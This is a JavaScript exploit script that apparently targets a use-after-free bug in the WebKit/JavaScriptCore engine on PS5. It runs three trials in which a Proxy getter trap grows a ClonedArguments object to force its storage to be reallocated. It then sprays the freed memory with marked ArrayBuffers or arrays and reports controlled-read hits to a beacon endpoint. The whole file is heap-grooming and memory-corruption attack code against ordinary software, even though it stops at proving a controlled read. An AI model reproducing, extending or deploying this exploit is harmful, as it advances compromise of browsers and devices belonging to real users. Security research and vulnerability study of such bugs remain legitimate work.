// p225 — ClonedArguments butterfly UAF: PreciseAllocation + safe spray
//
// PreciseAllocation realloc path (ButterflyInlines.h:193-223):
//   canRealloc = !propertyCapacity && !mutatorShouldBeFenced() && isPreciseAllocation()
//   → reallocatePreciseAllocationNonVirtual → libpas sync free
//
// PS5 uses 16KB pages. A 1200-element butterfly (9608B) PreciseAllocation
// might have up to 16384B of backing → vectorLength capacity ~2047.
// Must grow PAST that capacity to force realloc.
//
// Strategy:
// 1. Pre-allocate "blockers" to prevent in-place extension
// 2. Create 1200-element ClonedArguments
// 3. In trap: grow to 2200+ elements → exceeds 16KB slack → forced realloc
// 4. Old 9608B freed to libpas → spray with matching ArrayBuffers
//
// All spray patterns are Int32-encoded (0xFFFE0000_XXXX00YY) → safe, no pointer deref
//
// Beacon prefix: V225-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V225-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // ==== TEST A: 1200 elements + blockers + massive growth ====
  try {
    BS('A-START');
    var NARGS = 1200;
    var aTrap = 0;
    var aSpray = [];

    // Pre-allocate blockers to fragment heap after the butterfly
    // These occupy memory adjacent to where the butterfly will be allocated
    var blockers = [];
    for (var b = 0; b < 100; b++) {
      blockers.push(new ArrayBuffer(9600));
    }
    BS('A-BLOCKERS-' + blockers.length);

    var aArgs = [];
    for (var a = 0; a < NARGS; a++) aArgs.push(a + 1);
    var args1 = target.apply(null, aArgs);
    BS('A-ARGS-' + NARGS);

    // More blockers after the ClonedArguments allocation
    for (var b = 0; b < 100; b++) {
      blockers.push(new ArrayBuffer(9600));
    }

    delete args1[5];
    delete args1[10];
    delete args1[15];
    delete args1[20];
    delete args1[25];

    var trap1 = {
      get: function(t, prop) {
        aTrap++;
        if (aTrap === 1) {
          BS('A-TRAP-' + prop);

          // Grow by 1200 elements → from 1200 to 2400
          // Old: 9608B, New: 19208B → MUST move (old space can't hold 2x)
          for (var j = NARGS; j < NARGS + 1200; j++) args1[j] = 0x41;
          BS('A-GREW');

          // Flush libpas TLC dealloc log
          var flush = [];
          for (var f = 0; f < 300; f++) flush.push(new ArrayBuffer(64));
          flush = null;

          // Spray with Int32-encoded ArrayBuffers matching old size
          // Try multiple sizes near 9608 to hit the right libpas class
          // Old butterfly: 9608 bytes (8 header + 1200*8)
          // The PreciseAllocation adds its own header (maybe 32-64B)
          // But the freed block going back to libpas is the full allocation
          // ArrayBuffer header overhead is ~0 for the backing store
          var sizes = [9600, 9608, 9616, 9632, 9664, 9728];
          for (var si = 0; si < sizes.length; si++) {
            var sz = sizes[si];
            for (var s = 0; s < 500; s++) {
              var ab = new ArrayBuffer(sz);
              var v = new Uint32Array(ab);
              // Int32-encoded: upper32 = 0xFFFE0000, lower32 = marker + slot
              for (var k = 0; k < v.length; k += 2) {
                v[k] = 0xDEAD0000 | (k >> 1);
                v[k + 1] = 0xFFFE0000;
              }
              aSpray.push(ab);
            }
          }
          BS('A-SPRAYED-' + aSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args1, new Proxy({}, trap1));

    var result1;
    try {
      result1 = receiver.apply(null, args1);
    } catch (e) {
      BS('A-ERR-' + e.message.substring(0, 30));
    }

    if (result1) {
      BS('A-LEN-' + result1.length);

      var deadHits = 0;
      var nonOrig = 0;
      var holes = {5:1, 10:1, 15:1, 20:1, 25:1};
      for (var r = 0; r < Math.min(result1.length, 200); r++) {
        if (holes[r]) continue;
        var val = result1[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xDEAD) {
            deadHits++;
            if (deadHits <= 10) BS('A-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            nonOrig++;
            if (nonOrig <= 8) {
              var f64 = new Float64Array(1);
              f64[0] = val;
              var u32 = new Uint32Array(f64.buffer);
              BS('A-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
            }
          }
        } else if (typeof val === 'undefined' && !holes[r]) {
          nonOrig++;
          if (nonOrig <= 8) BS('A-UNDEF-' + r);
        } else if (typeof val === 'object' && val !== null && !holes[r]) {
          nonOrig++;
          BS('A-OBJ-' + r);
        }
      }
      BS('A-DEAD-' + deadHits);
      BS('A-NONORIG-' + nonOrig);
      if (deadHits > 0) BS('A-CONTROLLED-READ');

      // Report around first hole
      for (var h = 4; h <= 8; h++) {
        if (h === 5) continue;
        var v = result1[h];
        var f64 = new Float64Array(1);
        f64[0] = (typeof v === 'number') ? v : 0;
        var u32 = new Uint32Array(f64.buffer);
        BS('A-V' + h + '=' + hex(u32[1]) + '_' + hex(u32[0]) + '_T' + typeof v);
      }
    }
    blockers = null;
  } catch (e) {
    BS('A-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST B: 2000 elements (16008B → well above any MarkedBlock max) ====
  // Even with 16KB pages, 2000+1200=3200 elements → 25608B → forced move
  try {
    BS('B-START');
    var NARGS2 = 2000;
    var bTrap = 0;
    var bSpray = [];

    // Blockers
    var bBlock = [];
    for (var b = 0; b < 80; b++) bBlock.push(new ArrayBuffer(16000));

    var bArgs = [];
    for (var a = 0; a < NARGS2; a++) bArgs.push(a + 1);
    var args2 = target.apply(null, bArgs);

    for (var b = 0; b < 80; b++) bBlock.push(new ArrayBuffer(16000));

    delete args2[5];
    delete args2[10];
    delete args2[15];

    var trap2 = {
      get: function(t, prop) {
        bTrap++;
        if (bTrap === 1) {
          BS('B-TRAP-' + prop);

          // Grow from 2000 to 3200 → 16008B to 25608B → must move
          for (var j = NARGS2; j < NARGS2 + 1200; j++) args2[j] = 0x41;
          BS('B-GREW');

          var flush = [];
          for (var f = 0; f < 300; f++) flush.push(new ArrayBuffer(64));
          flush = null;

          // Spray with Int32-encoded at matching sizes
          var bSizes = [16000, 16008, 16016, 16064];
          for (var si = 0; si < bSizes.length; si++) {
            var sz = bSizes[si];
            for (var s = 0; s < 500; s++) {
              var ab = new ArrayBuffer(sz);
              var v = new Uint32Array(ab);
              for (var k = 0; k < v.length; k += 2) {
                v[k] = 0xCAFE0000 | (k >> 1);
                v[k + 1] = 0xFFFE0000;
              }
              bSpray.push(ab);
            }
          }
          BS('B-SPRAYED-' + bSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, trap2));

    var result2;
    try {
      result2 = receiver.apply(null, args2);
    } catch (e) {
      BS('B-ERR-' + e.message.substring(0, 30));
    }

    if (result2) {
      BS('B-LEN-' + result2.length);
      var cafeHits = 0;
      var bNonOrig = 0;
      var bHoles = {5:1, 10:1, 15:1};
      for (var r = 0; r < Math.min(result2.length, 200); r++) {
        if (bHoles[r]) continue;
        var val = result2[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xCAFE) {
            cafeHits++;
            if (cafeHits <= 10) BS('B-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            bNonOrig++;
          }
        }
      }
      BS('B-CAFE-' + cafeHits);
      BS('B-NONORIG-' + bNonOrig);
      if (cafeHits > 0) BS('B-CONTROLLED-READ');
    }
    bBlock = null;
  } catch (e) {
    BS('B-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST C: Direct butterfly spray (same allocator path) ====
  // Instead of ArrayBuffer, spray with JSArray butterflies
  // These go through vm.auxiliarySpace() → same path as the freed butterfly
  try {
    BS('C-START');
    var NARGS3 = 1200;
    var cTrap = 0;
    var cSpray = [];

    var cBlock = [];
    for (var b = 0; b < 100; b++) cBlock.push(new ArrayBuffer(9600));

    var cArgs = [];
    for (var a = 0; a < NARGS3; a++) cArgs.push(a + 1);
    var args3 = target.apply(null, cArgs);

    for (var b = 0; b < 100; b++) cBlock.push(new ArrayBuffer(9600));

    delete args3[3];
    delete args3[7];
    delete args3[11];

    var trap3 = {
      get: function(t, prop) {
        cTrap++;
        if (cTrap === 1) {
          BS('C-TRAP-' + prop);

          for (var j = NARGS3; j < NARGS3 + 1200; j++) args3[j] = 0x41;
          BS('C-GREW');

          // Spray with JSArray butterflies of 1200 elements
          // These go through auxiliarySpace (GC-managed) → same as original butterfly
          // If the realloc freed to libpas, the auxiliary space might reuse the cell
          for (var s = 0; s < 2000; s++) {
            var a = new Array(NARGS3);
            for (var k = 0; k < NARGS3; k++) {
              a[k] = 0xBEEF0000 | (k & 0xFFFF);
            }
            cSpray.push(a);
          }
          BS('C-SPRAYED-' + cSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args3, new Proxy({}, trap3));

    var result3;
    try {
      result3 = receiver.apply(null, args3);
    } catch (e) {
      BS('C-ERR-' + e.message.substring(0, 30));
    }

    if (result3) {
      BS('C-LEN-' + result3.length);
      var beefHits = 0;
      var cNonOrig = 0;
      var cHoles = {3:1, 7:1, 11:1};
      for (var r = 0; r < Math.min(result3.length, 200); r++) {
        if (cHoles[r]) continue;
        var val = result3[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xBEEF) {
            beefHits++;
            if (beefHits <= 10) BS('C-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            cNonOrig++;
            if (cNonOrig <= 5) {
              var f64 = new Float64Array(1);
              f64[0] = val;
              var u32 = new Uint32Array(f64.buffer);
              BS('C-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
            }
          }
        }
      }
      BS('C-BEEF-' + beefHits);
      BS('C-NONORIG-' + cNonOrig);
      if (beefHits > 0) BS('C-CONTROLLED-READ');
    }
    cBlock = null;
  } catch (e) {
    BS('C-OUTER-ERR-' + e.message.substring(0, 40));
  }

  BS('DONE');
})();
